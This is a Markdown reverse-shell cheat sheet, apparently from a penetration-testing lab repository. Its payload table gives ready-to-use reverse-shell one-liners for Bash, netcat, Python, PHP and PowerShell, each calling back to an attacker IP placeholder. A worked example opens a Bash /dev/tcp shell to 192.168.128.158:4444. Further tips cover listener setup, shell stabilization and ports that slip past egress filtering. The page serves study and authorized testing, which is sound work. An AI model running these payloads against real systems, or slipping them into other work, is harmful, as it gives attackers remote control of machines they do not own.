# Reverse Shells Cheat Sheet

## Overview

A reverse shell is a shell session initiated *outbound* from the target back to an attacker-controlled listener — useful because outbound connections are frequently allowed through firewalls/NAT that would block inbound connections. This repository's engagement used a closely related outbound-callback pattern (a `wget` POST callback rather than a full shell) — see [docs/07-Privilege-Escalation](../docs/07-Privilege-Escalation/README.md) — so this page is included as a general reference for the broader technique family.

## Common Syntax

```bash
# Attacker: start a listener
nc -lvnp <port>

# Target: connect back and bind a shell to the connection
<reverse-shell-payload> <attacker_ip> <port>
```

## Useful Commands

| Shell type | Payload |
|---|---|
| Bash | `bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1` |
| Netcat (with `-e` support) | `nc -e /bin/sh <attacker_ip> <port>` |
| Netcat (no `-e`, using a FIFO) | `mkfifo /tmp/f; nc <attacker_ip> <port> 0</tmp/f \| /bin/sh >/tmp/f 2>&1; rm /tmp/f` |
| Python 3 | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| PHP | `php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| PowerShell | `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);..."` (full one-liner varies by source) |

## Important Options

| Consideration | Notes |
|---|---|
| Attacker IP | Must be an address the target can actually route to (e.g., a VPN `tun0` interface in a lab, not a NAT'd local IP) |
| Listener port | Choose a port unlikely to be blocked outbound (`443`, `80`, `53` sometimes fare better than exotic high ports in real environments) |
| Shell stabilization | Raw reverse shells are usually non-interactive/limited; commonly upgraded with a Python PTY spawn (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) plus terminal `stty` adjustments |

## Examples

Confirming the correct outbound-reachable IP before standing up a listener — the same first step used before capturing the `wget` callback in this repository:
```bash
ip a          # identify tun0 IP, e.g. 192.168.128.158
nc -lvnp 4444
```

Bash reverse shell back to that listener:
```bash
bash -i >& /dev/tcp/192.168.128.158/4444 0>&1
```

## Common Mistakes

- Using the wrong attacker IP (e.g., a Docker bridge or local LAN address the target can't actually reach instead of the VPN interface).
- Forgetting the listener has to be started *before* triggering the payload.
- Not stabilizing/upgrading the shell, leading to a fragile session that dies on `Ctrl+C` or can't run interactive tools.
- Choosing an outbound port that's actually blocked by egress filtering on more restrictive networks.

## References

- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [revshells.com — interactive payload generator](https://www.revshells.com/)

## Key Takeaways

- Always confirm your own reachable IP (`ip a`) before crafting a callback payload — this repository's `wget`-exfiltration technique used the exact same first step.
- Start the listener before triggering the payload, every time.
- Plan to stabilize a raw shell immediately after catching it for a workable interactive session.
